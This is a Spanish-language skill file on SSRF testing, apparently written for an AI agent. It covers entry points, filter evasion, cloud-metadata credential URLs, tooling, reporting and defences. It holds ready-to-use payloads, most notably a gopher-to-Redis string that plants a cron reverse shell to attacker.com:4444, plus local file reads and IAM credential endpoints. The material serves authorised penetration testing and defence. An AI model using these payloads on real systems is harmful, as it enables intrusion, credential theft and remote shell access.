---
name: ssrf-testing
description: Habilidades profesionales y metodología para pruebas de falsificación de solicitudes del lado del servidor (SSRF)
version: 1.0.0
---

# Pruebas de falsificación de solicitudes del lado del servidor (SSRF)

## Descripción general

SSRF (Server-Side Request Forgery) es una vulnerabilidad que aprovecha el servidor para iniciar solicitudes, lo que permite acceder a recursos de la red interna, realizar escaneo de puertos o eludir firewalls. Esta habilidad proporciona métodos para la detección, explotación y protección contra vulnerabilidades SSRF.

## Principio de la vulnerabilidad

La aplicación acepta un parámetro URL y solicita esa URL. El atacante puede controlar el objetivo de la solicitud, lo que resulta en:
- Acceso a recursos de la red interna
- Lectura de archivos locales
- Escaneo de puertos
- Evasión de firewalls
- Acceso a metadatos de servicios en la nube

## Métodos de prueba

### 1. Identificar puntos de entrada SSRF

**Funciones comunes:**
- Vista previa/captura de pantalla de URL
- Carga de archivos (URL remota)
- Callbacks de Webhook
- Proxy de API
- Importación de datos
- Procesamiento de imágenes
- Generación de PDF

### 2. Detección básica

**Probar loopback local:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Probar IPs de la red interna:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Probar protocolo de archivos:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Técnicas de evasión

**Codificación de direcciones IP:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hexadecimal)
127.0.0.1 → 0177.0.0.1 (octal)
```

**Evasión de resolución de nombres de dominio:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**Redirección de URL:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Ofuscación de protocolo:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Técnicas de explotación

### Detección de red interna

**Escaneo de puertos:**
```bash
# Usar Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Identificación de servicios:**
- Diferencias en el tiempo de respuesta
- Mensajes de error
- Códigos de estado HTTP
- Contenido de la respuesta

### Metadatos de servicios en la nube

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Ataques a aplicaciones de la red interna

**Acceso al panel de administración:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Acceso no autorizado a Redis:**
```
http://127.0.0.1:6379
# Luego enviar comandos de Redis
```

**Ataque FastCGI:**
```
http://127.0.0.1:9000
# Explotar el protocolo FastCGI para ejecutar comandos
```

## Explotación avanzada

### Protocolo Gopher

**Enviar datos de protocolo arbitrarios:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Ejecución de comandos en Redis:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Protocolo Dict

**Escaneo de puertos y recopilación de información:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### Protocolo de archivos

**Lectura de archivos locales:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Uso de herramientas

### SSRFmap

```bash
# Escaneo básico
python3 ssrfmap.py -r request.txt -p url

# Escaneo de puertos
python3 ssrfmap.py -r request.txt -p url -m portscan

# Metadatos en la nube
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generar payload de Gopher
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detección de SSRF ciego:**
```
http://burpcollaborator.net
# Observar si hay solicitudes DNS/HTTP
```

## Verificación y reporte

### Pasos de verificación

1. Confirmar que se puede controlar el objetivo de la solicitud
2. Verificar el acceso a recursos de la red interna o el escaneo de puertos
3. Evaluar el alcance del impacto (pentesting en la red interna, fuga de datos, etc.)
4. Registrar el PoC completo

### Puntos clave del reporte

- Ubicación de la vulnerabilidad y parámetros de entrada
- Recursos de la red interna o puertos accesibles
- Pasos completos de explotación y PoC
- Sugerencias de remediación (lista blanca de URL, deshabilitar protocolos peligrosos, etc.)

## Medidas de protección

### Soluciones recomendadas

1. **Lista blanca de URL**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Deshabilitar protocolos peligrosos**
   - Solo permitir http/https
   - Prohibir file://, gopher://, dict://, etc.

3. **Filtrado de direcciones IP**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **Usar verificación de resolución DNS**
   - Resolver el nombre de dominio para obtener la IP
   - Verificar si la IP está dentro del rango de la red interna

5. **Aislamiento de red**
   - Restringir los permisos de salida del servidor
   - Usar servidores proxy

## Consideraciones

- Realizar solo en entornos de pruebas de seguridad autorizados
- Evitar causar impacto en los sistemas de la red interna
- Prestar atención al soporte de diferentes protocolos
- Controlar la frecuencia de las solicitudes durante las pruebas para evitar activar protecciones